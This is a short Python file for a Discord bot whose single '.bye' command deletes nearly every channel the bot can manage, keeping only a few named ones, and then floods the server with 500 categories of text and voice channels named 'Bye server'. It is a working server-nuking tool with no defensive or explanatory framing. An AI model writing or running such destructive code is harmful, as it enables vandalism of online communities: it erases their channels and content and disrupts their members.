import discord
import asyncio
from discord.ext import commands, tasks
from discord.utils import find, get
import os
from dotenv import load_dotenv

discord.utils.setup_logging()
intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix = '.', intents = intents)

@client.command()
async def bye(ctx):
    for channel in ctx.guild.channels:
        Bot = ctx.message.guild.get_member(client.user.id)
        perms = channel.permissions_for(Bot)
        if hasattr(perms, 'manage_channels'):
            if perms.manage_channels == True and channel.name not in ["moderator only", "announcements", "rules"]:
                await channel.delete()
    for f in range(0, 500):
        category = await ctx.guild.create_category("Bye server")
        await category.create_text_channel("Bye server")
        await category.create_voice_channel("Bye server")


async def main():
    async with client:
        await client.start(os.getenv("ABYSS_BOT_TOKEN"))

asyncio.run(main())




